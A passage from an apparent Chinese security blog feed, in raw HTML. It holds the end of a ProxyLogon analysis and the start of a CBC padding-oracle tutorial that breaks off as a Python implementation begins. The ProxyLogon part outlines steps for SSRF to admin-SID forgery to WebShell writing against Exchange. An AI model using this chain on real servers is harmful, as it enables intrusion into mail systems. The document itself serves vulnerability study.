class="title">FromString</span>(<span class="params"><span class="keyword">string</span> input</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnCalculateTargetBackEndCompleted</span>(<span class="params"><span class="keyword">object</span> extraData</span>)</span></span><br><span class="line"><span class="function">            <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InternalOnCalculateTargetBackEndCompleted</span>(<span class="params">TargetCalculationCallbackBeacon beacon</span>)</span></span><br><span class="line"><span class="function">                <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BeginValidateBackendServerCacheOrProxyOrRecalculate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">BeginProxyRequestOrRecalculate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">BeginProxyRequest</span>(<span class="params"><span class="keyword">object</span> extraData</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                            <span class="keyword">protected</span> <span class="keyword">virtual</span> Uri <span class="title">GetTargetBackEndServerUrl</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                            <span class="keyword">protected</span> HttpWebRequest <span class="title">CreateServerRequest</span>(<span class="params">Uri targetUrl</span>)</span></span><br><span class="line"><span class="function">                                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">PrepareServerRequest</span>(<span class="params">HttpWebRequest serverRequest</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                                        <span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">string</span> KerberosUtilities.<span class="title">GenerateKerberosAuthHeader</span>(<span class="params">...</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                                <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CopyHeadersToServerRequest</span>(<span class="params">HttpWebRequest destination</span>)</span></span><br><span class="line"><span class="function">                                            <span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">ShouldCopyHeaderToServerRequest</span>(<span class="params"><span class="keyword">string</span> headerName</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                            <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CopyCookiesToServerRequest</span>(<span class="params">HttpWebRequest serverRequest</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                            <span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">SetProtocolSpecificServerRequestParameters</span>(<span class="params">HttpWebRequest serverRequest</span>)</span></span><br><span class="line"><span class="function">                            <span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">AddProtocolSpecificHeadersToServerRequest</span>(<span class="params">WebHeaderCollection headers</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                            <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BeginGetServerResponse</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                                <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ResponseReadyCallback</span>(<span class="params">IAsyncResult result</span>)</span></span><br><span class="line"><span class="function">                                    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnResponseReady</span>(<span class="params"><span class="keyword">object</span> extraData</span>)</span></span><br><span class="line"><span class="function">                                        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ProcessResponse</span>(<span class="params">WebException exception</span>)</span></span><br><span class="line"><span class="function">                                            <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CopyHeadersToClientResponse</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                                            <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CopyCookiesToClientResponse</span>(<span class="params"></span>)</span></span><br></pre></td></tr></table></figure><p><code>BackEndServer.FromString</code>方法获取Cookie的<code>X-BEResource</code>值中，以<code>～</code>波浪线分隔开的FQDN和version，而且涉及一处补丁变更：</p><p><img src="/img/proxylogon_h.png"></p><p>这里的值可以由Cookie控制，调用<code>FromString</code>的<code>ResolveAnchorMailbox</code>方法也有补丁变更，基本可以说明漏洞点就在这附近了。果然随后的<code>GetTargetBackEndServerUrl</code>方法就把Fqdn赋值给了UriBuilder对象Host属性：</p><p><img src="/img/proxylogon_i.png"></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">virtual</span> UriBuilder <span class="title">GetClientUrlForProxy</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> UriBuilder(<span class="keyword">this</span>.ClientRequest.Url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UriBuilder是一个.NET类，在微软的<a href="https://referencesource.microsoft.com/#system/net/system/uribuilder.cs">Reference Source</a>找到源码。如果传入的Host中存在<code>:</code>冒号，并且不是<code>[</code>开头，就用一对中括号将值包裹起来。：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">string</span> Host &#123;</span><br><span class="line">    <span class="keyword">get</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> m_host;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">value</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">value</span> = String.Empty;</span><br><span class="line">        &#125;</span><br><span class="line">        m_host = <span class="keyword">value</span>;</span><br><span class="line">        <span class="comment">//probable ipv6 address - </span></span><br><span class="line">        <span class="keyword">if</span> (m_host.IndexOf(<span class="string">&#x27;:&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//set brackets</span></span><br><span class="line">            <span class="keyword">if</span> (m_host[<span class="number">0</span>] != <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">                m_host = <span class="string">&quot;[&quot;</span> + m_host + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m_changed = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据传入的version是否大于Server.E15MinVersion（1941962752），将Port赋值为444或443。最后由Uri属性的get访问器（accessor）调用ToString将各部分拼接还原：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri Uri &#123;</span><br><span class="line">    <span class="keyword">get</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (m_changed) &#123;</span><br><span class="line">            m_uri = <span class="keyword">new</span> Uri(ToString());</span><br><span class="line">            SetFieldsFromUri(m_uri);</span><br><span class="line">            m_changed = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> m_uri;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到后端URL之后继续处理请求头，将<code>GenerateKerberosAuthHeader</code>方法生成的Kerberos票据放入Authorization请求头。<code>CopyHeadersToServerRequest</code>方法会筛选出后端需要的请求头，其中<code>ShouldCopyHeaderToServerRequest</code>方法用来过滤一些自定义请求头：</p><p><img src="/img/proxylogon_j.png"></p><p>最后<code>AddProtocolSpecificHeadersToServerRequest</code>方法会将序列化得到的用于标识用户身份的Token，放入<code>X-CommonAccessToken</code>请求头中：</p><p><img src="/img/proxylogon_k.png"></p><p>相应的，后端模块会由<code>AllowsTokenSerializationBy</code>方法校验通常机器用户才有的<code>ms-Exch-EPI-Token-Serialization</code>扩展权限（验证请求由CAS发出），随后反序列化还原<code>X-CommonAccessToken</code>请求头的身份标识。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Microsoft.Exchange.Security.Authentication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BackendRehydrationModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    public void Init(HttpApplication application)</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnAuthenticateRequest</span>(<span class="params"><span class="keyword">object</span> source, EventArgs args</span>)</span></span><br><span class="line"><span class="function">            <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ProcessRequest</span>(<span class="params">HttpContext httpContext</span>)</span></span><br><span class="line"><span class="function">                <span class="keyword">private</span> <span class="keyword">bool</span> <span class="title">TryGetCommonAccessToken</span>(<span class="params">HttpContext httpContext, Stopwatch stopwatch, <span class="keyword">out</span> CommonAccessToken token</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                    <span class="keyword">private</span> <span class="keyword">bool</span> <span class="title">IsTokenSerializationAllowed</span>(<span class="params">WindowsIdentity windowsIdentity</span>)</span></span><br><span class="line"><span class="function">            <span class="title">using</span> (<span class="params">ClientSecurityContext clientSecurityContext = new ClientSecurityContext(windowsIdentity</span>))</span></span><br><span class="line"><span class="function"></span>            &#123;</span><br><span class="line">            flag2 = LocalServer.AllowsTokenSerializationBy(clientSecurityContext);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">                    token = CommonAccessToken.Deserialize(text);</span><br><span class="line">                    httpContext.Items[<span class="string">&quot;Item-CommonAccessToken&quot;</span>] = token;</span><br></pre></td></tr></table></figure><p>小结一下，Cookie的<code>X-BEResource</code>值可以控制CAS请求的Host，结合UriBuilder类特性可以构造出可控的完整URL，因为采用Kerberos认证所以不能向任意站点发起请求：</p><p><img src="/img/proxylogon_l.png"></p><p><code>X-FEServer</code>响应头的值就是计算机名，可以用它构造URL请求后端服务：</p><p><img src="/img/proxylogon_m.png"></p><ul><li>Exchange2013需要将Version设置为大于1941962752的值</li></ul><h2 id="CVE-2021-27065"><a href="#CVE-2021-27065" class="headerlink" title="CVE-2021-27065"></a>CVE-2021-27065</h2><p><code>Microsoft.Exchange.Management.DDIService.WriteFileActivity</code>未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell。</p><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><code>Microsoft.Exchange.Management.DDIService.WriteFileActivity</code>中有一处明显的补丁变动，使得文件后缀名只能为txt。</p><p><img src="/img/proxylogon_n.png"></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> <span class="keyword">string</span> textExtension = <span class="string">&quot;.txt&quot;</span>;</span><br></pre></td></tr></table></figure><p>以<code>ResetOABVirtualDirectory</code>触发点为例，利用流程如下（均通过SSRF发起）：</p><ol><li>请求EWS，从<code>X-CalculatedBETarget</code>响应头获取后端域名</li></ol><p><img src="/img/proxylogon_o.png"></p><ol start="2"><li>爆破邮箱用户名，请求Autodiscover获取配置中的LegacyDN</li></ol><p><img src="/img/proxylogon_p.png"></p><ol start="3"><li>由<code>MAPI over HTTP</code>请求引发<code>Microsoft.Exchange.RpcClientAccess.Server.LoginPermException</code>，获取SID</li></ol><p><img src="/img/proxylogon_q.png"></p><ol start="4"><li>替换尾部RID为500，伪造管理员SID，由ProxyLogonHandler获取管理员身份<code>ASP.NET_SessionId</code>与<code>msExchEcpCanary</code>：</li></ol><p><img src="/img/proxylogon_r.png"></p><ol start="5"><li>通过DDI组件Getlist接口获取RawIdentity（GetObject接口有时候返回NULL）</li></ol><p><img src="/img/proxylogon_s.png"></p><ol start="6"><li>利用外部URL虚拟路径属性引入WebShell</li></ol><p><img src="/img/proxylogon_t.png"></p><ol start="7"><li>最后触发重置时的备份功能，将文件写入指定的UNC目录</li></ol><p><img src="/img/proxylogon_u.png"></p><ul><li>WebShell的内容需要规避会被URL编码的特殊字符，且字符长度不能超过255</li></ul><p><em>下一篇我们将一起讨论ProxyOracle～</em></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/exchange/architecture/architecture?view=exchserver-2019">Exchange architecture</a></p><p><a href="https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/web-services-reference-for-exchange">Web services reference for Exchange</a></p><p><a href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">HAFNIUM targeting Exchange Servers with 0-day exploits</a></p><p><a href="https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-2016-and-2013-march-2-2021-kb5000871-9800a6bb-0a21-4ee7-b9da-fa85b3e1d23b">Description of the security update for Microsoft Exchange Server 2019, 2016, and 2013: March 2, 2021 (KB5000871)</a></p><p><a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/">Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities</a></p><p><a href="https://www.praetorian.com/blog/reproducing-proxylogon-exploit/">Reproducing the Microsoft Exchange Proxylogon Exploit Chain</a></p><p><a href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265">Phân tích lỗ hổng ProxyLogon — Mail Exchange RCE (Sự kết hợp hoàn hảo CVE-2021–26855 + CVE-2021–27065)</a></p><p><a href="http://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html">A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</a></p><p><a href="https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/">Attacking MS Exchange Web Interfaces</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;组件架构&quot;&gt;&lt;a href=&quot;#组件架构&quot; class=&quot;headerlink&quot; title=&quot;组件架构&quot;&gt;&lt;/a&gt;组件架构&lt;/h2&gt;&lt;p&gt;Exchange不同版本的组件架构并不相同，但总体上可以将其分为核心的邮箱服务器角色（Mailbox Role）和可选的边缘</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Exchange" scheme="https://hosch3n.github.io/tags/Exchange/"/>
    
    <category term="SSRF" scheme="https://hosch3n.github.io/tags/SSRF/"/>
    
    <category term="CVE-2021-26855" scheme="https://hosch3n.github.io/tags/CVE-2021-26855/"/>
    
    <category term="CVE-2021-27065" scheme="https://hosch3n.github.io/tags/CVE-2021-27065/"/>
    
  </entry>
  
  <entry>
    <title>PaddingOracle攻击原理</title>
    <link href="https://hosch3n.github.io/2021/08/10/PaddingOracle%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/"/>
    <id>https://hosch3n.github.io/2021/08/10/PaddingOracle%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/</id>
    <published>2021-08-10T14:29:07.000Z</published>
    <updated>2022-05-11T08:31:22.693Z</updated>
    
    <content type="html"><![CDATA[<p>根据加解密时是否用同一组密钥，可以分为对称加密和非对称加密。对称加密中根据对数据处理粒度的不同，可以分为分组加密算法（AES、3DES、DES、Blowfish、RC2、CAST）和流加密算法（ChaCha20、Salsa20、RC4）</p><ul><li>常见的非对称加密算法有RSA、ElGamal、DSA、ECC等</li></ul><p>分组加密算法中根据加解密时对数据的分组编排方式，经典工作模式有ECB、CBC、PCBC、CFB、OFB、CTR等，其中后三者可以将分组加密转化为流加密形式。为了在保证机密性的前提下进一步保证完整性，现代工作模式有CCM（CBC-MAC）、EAX、GCM、SIV（Synthetic Initialization Vector）、OCB（Offset CodeBook）等。</p><h2 id="分组加密方式简介"><a href="#分组加密方式简介" class="headerlink" title="分组加密方式简介"></a>分组加密方式简介</h2><p>分组加密方式只能使用一个固定大小的密钥加密相同字节长度的明文，所以需要将加密的明文按照密钥大小拆分为多块（所以也叫块加密），如果拆分后最后一个块明文长度不够，就需要填充字节来补齐长度。按照常见的PKCS#5或PKCS#7标准，最后需要填充几个字节，那么所填充的字节的值就用几；如果明文最后一个块刚好满足长度大小，那就需要填充完整一个块。</p><p>举个例子，对称密钥为<code>12345678</code>时长度为8，当待加密的明文为<code>abcdefg</code>时其长度为7，填充后的块为<code>[a][b][c][d][e][f][g][0x01]</code>;当待加密的明文为<code>abcdefghabcdef</code>时其长度为14，填充后的块为<code>[a][b][c][d][e][f][g][h][a][b][c][d][e][f][0x02][0x02]</code>；当待加密的明文为<code>abcdefgh</code>时其长度为8，填充后的块为<code>[a][b][c][d][e][f][g][h][0x08][0x08][0x08][0x08][0x08][0x08][0x08][0x08]</code>。</p><h2 id="异或和可逆性"><a href="#异或和可逆性" class="headerlink" title="异或和可逆性"></a>异或和可逆性</h2><p>异或的概念对于二进制位而言，就是两个位不同则得到1，两个位相同则得到0。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ^ <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> ^ <span class="number">0</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> ^ <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> ^ <span class="number">0</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看出异或的结果与参与运算的两个值先后顺序没有关系，按小学的说法可以称为异或交换律。= =</p><p>再看仔细一些可以知道，如果A^B=C，那么A^C=B、B^C=A，说明异或具有可逆性。</p><p>两个十进制的异或就是都转为二进制再逐位异或。两个字节的异或，就是对字节取ASCII码（十进制）再。。。两个长度相同字符串的异或就是逐字节。。。所以字符串的异或本质就是二进制位的异或，这说明异或的可逆性同样适用于字符串。</p><h2 id="CBC工作模式简介"><a href="#CBC工作模式简介" class="headerlink" title="CBC工作模式简介"></a>CBC工作模式简介</h2><p><img src="/img/pdoa_a.png"></p><p>Plaintext指明文块，Ciphertext指密文块，key指对称密钥，<code>⊕</code>符号表示异或。</p><p>IV（Initialization Vector）是每次加密时都应随机生成的一串与分块大小相同的随机值，随机IV的存在使得相同的对称密钥加密两次相同的明文也会得到不同的密文，规避了ECB模式相关安全问题。如果某些具体实现中IV重复使用或是可以预测，亦或是使用全0的IV则会导致明文块泄漏，但这不是本文讨论的重点。</p><p>加密时先将第一块明文与初始IV异或，再将异或后的块用对称密钥加密得到第一块密文。第一块密文会作为第二块的IV，与第二块明文异或后再用对称密钥加密得到第二块密文，直到最后一块密文加密完成。</p><ul><li>从第二块明文开始，每块明文加密都需要用到上一块的密文作为IV，加密过程无法并行</li></ul><p>解密时先将密文用对称密钥解密得到一个中间值，将此中间值与IV异或得到明文。注意我现在没有说第一块了，因为IV此时都是已知的，每两个密文块就可以解出一个明文块，解密过程可以并行。</p><p>因为解密第一块密文时需要初始的IV，而初始IV在密码学中本就没有保密性要求，通常都会将初始IV拼接到密文头部一起发给客户端（至于为什么拼接在头部而不是尾部或是单独分开，因为上一块密文就是下一块密文IV，拼接到头部其实就是让IV作为第零块密文，顺其自然地成为第一块密文的IV）。</p><h2 id="PaddingOracle"><a href="#PaddingOracle" class="headerlink" title="PaddingOracle"></a>PaddingOracle</h2><p>PaddingOracle一般是指对称加密算法CBC工作模式的一种攻击方式。如果能够区分密文解密出错的原因，是由于填充错误（比如填充的<code>[0x01][0x02]</code>），还是由于正常解密出的明文在具体的业务环境中报错（比如判断role是<code>admin</code>还是<code>member</code>，结果解密出来是<code>!@#$</code>），就能在不知道对称密钥的情况下，利用错误回显或是时间延迟的侧信道，爆破和推测出密文被对称密钥解密后的 中间值，进一步可以推测出密文被完整解密后的 原始明文，或是利用中间值结合可控的IV逆推构造出 想要的明文。</p><ul><li>利用错误回显或是时间延迟做判断的这个过程就称为oracle</li></ul><h3 id="推导明文"><a href="#推导明文" class="headerlink" title="推导明文"></a>推导明文</h3><p>下面来分析下具体流程，我们先从多个加密块的第一个块说起，我将密文块被对称密钥解密后的值称为中间值，中间值与IV异或后会得到完整解密的明文块。</p><p>首先需要思考的是，解密时如何判断填充的字节有没有出错呢？答案是从完整解密后的明文块最后一个字节开始读，如果发现最后一个字节是<code>0x03</code>，那么就继续读倒数第二个字节、倒数第三个字节并确认其都是<code>0x03</code>，如果倒数第二或第三个字节不是<code>0x03</code>就说明出现了填充错误。</p><p>那么通过某种手段使明文最后一个字节为<code>0x01</code>时，读完最后一个字节后就不会再向前校验了，所以这个块无论如何都不会出现填充错误。明文最后一个字节是由中间值最后一个字节与IV最后一个字节异或而来，那么就存在以下推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必然存在一个guess_iv[-1]值符合</span></span><br><span class="line">guess_iv[<span class="number">-1</span>] ^ middle[<span class="number">-1</span>] = <span class="number">0x01</span></span><br><span class="line"><span class="comment"># 根据异或可逆性反推出真实中间值middle[-1]</span></span><br><span class="line">middle[<span class="number">-1</span>] = guess_iv[<span class="number">-1</span>] ^ <span class="number">0x01</span></span><br><span class="line"><span class="comment"># 得到真实中间值middle[-1]后，与原本的iv[-1]算出真实的明文plain[-1]</span></span><br><span class="line">plain[<span class="number">-1</span>] = iv[<span class="number">-1</span>] ^ middle[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>虽然但是，那怎么知道这个必然存在的值是什么呢？在IV可控且能区分出有没有填充错误时，我们可以对IV最后一个字节进行爆破，如果不是这个<code>必然存在的值</code>，解密后明文最后一个字节不是<code>0x01</code>就会出现填充错误，没有填充错误时就说明我们爆破到了这个<code>必然存在的值</code>。因为1个字节是8个二进制位，最多只需要爆破2的8次方=256次就可以得到。</p><ul><li>可能有小伙伴会说假如这个块本身就是填充的<code>0x02</code>呢，那解密成<code>0x02</code>和<code>0x01</code>就都不会出现填充错误，注意开头说了我们目前分析的是多个加密块的第一个块，这种情况下第一个块不可能出现填充字节，而正常的明文一般也不会出现<code>0x02</code>，更多细节我们稍后讨论</li></ul><p>知道中间值最后一个字节后，我们就能继续推导构造后两个字节的明文值，进而得到倒数第二个字节的中间值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我们已经知道中间值最后一个字节</span></span><br><span class="line">guess_iv[<span class="number">-1</span>] ^ middle[<span class="number">-1</span>] = <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 可以直接逆推出需要构造的guess_iv[-1]</span></span><br><span class="line">guess_iv[<span class="number">-1</span>] = middle[<span class="number">-1</span>] ^ <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 同样的方法爆破出guess_iv[-2]</span></span><br><span class="line">guess_iv[<span class="number">-2</span>] ^ middle[<span class="number">-2</span>] = <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 进一步推导出中间值middle[-2]</span></span><br><span class="line">middle[<span class="number">-2</span>] = guess[<span class="number">-2</span>] ^ <span class="number">0x02</span></span><br><span class="line"><span class="comment"># 得到真实中间值middle[-2]后，与原本的iv[-2]算出真实的明文plain[-2]</span></span><br><span class="line">plain[<span class="number">-2</span>] = iv[<span class="number">-2</span>] ^ middle[<span class="number">-2</span>]</span><br></pre></td></tr></table></figure><p>重复这个套路，可以一直向前爆破和推导出这个块中间值和明文的每个字节，再对每个块重复这个套路就可以得到每个块中间值和明文的每个字节，与正常解密过程一样可以并行处理。这里清晰后就是时候讨论我们一直刻意忽略的，只有一个块或是最后一个块的填充问题了。</p><p>如果填充值是<code>0x03</code>或更大，由于是从后往前推出<code>[0x01]</code>，<code>[0x02][0x02]</code>，存在多位相互校验就不会出现Oracle时的误判。而不论明文刚好本身倒数第二个字节是<code>0x02</code>还是最后一个块填充后有两个<code>0x02</code>，都有可能出现明文最后一个字节首先爆破成的是<code>0x02</code>（而非<code>0x01</code>），但由于不会出现填充错误，导致我们误以为使用这个guess_iv[-1]实际构造的出的是<code>0x01</code>。</p><p>在群里讨论后，@香依香偎 师傅给出的思路是在最后一个填充字节判断成功的情况下，构造倒数第二字节为任意值都不出现填充错误，就说明倒数第一个字节确实构造成了<code>0x01</code>，也就是上文所说的情况了；而如果构造倒数第二字节时出现了填充错误，就说明我们构造出的明文最后一个字节其实是<code>0x02</code>（妙啊）。同时@Vanish 牛也提醒了，在这种得到错误<code>middle[-1]</code>的情况下，进行后续步骤就会出错。所以这种情况推导<code>middle[-1]</code>用<code>guess_iv[-1] ^ 0x02</code>就行了。</p><h3 id="构造密文"><a href="#构造密文" class="headerlink" title="构造密文"></a>构造密文</h3><p>理解了推导明文的过程，构造密文（也称为CBC翻转）就很简单了。爆破推测出每一个字节的中间值，调整各个IV的各个字节使其与中间值异或后就是我们想要的明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 推导需要构造出的IV</span></span><br><span class="line">middle[i] ^ admin[i] = iv[i]</span><br><span class="line"><span class="comment"># 中间值与构造的IV异或后会得到想要的明文</span></span><br><span class="line">middle[i] ^ iv[i] = admin[i]</span><br></pre></td></tr></table></figure><p>由于第N块密文的IV就是第N-1块密文本身，所以我们需要从后向前先推出最后一块、再倒数第二、第三。。。一直推到第一块并构造出需要的原始IV，其实就是个逆序加密的过程，与正常加密过程一样不能够并行处理。</p><h3 id="没有IV与IV不可控"><a href="#没有IV与IV不可控" class="headerlink" title="没有IV与IV不可控"></a>没有IV与IV不可控</h3><p>设想一种没有IV且IV不可控的情况，服务器端加密<code>xxx: abc; user: member;...</code>原始信息，只将加密后的密文作为Cookie发往浏览器，而将用于加密的初始IV维护在服务器Session中，此时得不到初始IV也就没法套路出第一块密文的明文块了（但中间值还是能推测出来的），后续密文块的IV就是前一个密文块，所以第一块之外的密文还是能解出明文。对于CBC翻转来说，第一块明文的内容就没法构造了，为了配合后续块解密，被我们构造出的第一块密文也会被初始IV异或得不成样子。</p><p>假如此时通过某种途径泄漏出了Session里的初始IV，也就是有初始IV但IV不可控的情况，那么就能完整解密出包括第一块在内的全部明文。CBC翻转情况不变。</p><p>又假如通过某种途径导致Session里的初始IV可控（但读不到原本的初始IV），也就是没有初始IV但IV可控的情况，那么就能完整构造出包括第一块密文在内的全部密文。明文解密情况不变。</p><p>所以能不能读到初始IV影响原本第一块明文的解密，初始IV可不可控影响第一块明文的构造。</p><h3 id="Python实现"><a href="#Python实现" class="headerlink" title="Python实现"></a>Python实现</h3><p>考古了道哥写的py2demo，用Python3重写了一份，注意的是这份代码中判断填充正确与否是直接用了padding_byte值，所以不会出现上文讨论的<code>0x02</code>导致误判的情况，但实战环境中就需要改写为通过HTTP状态码、错误回显、时间延迟等手段进行判断了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 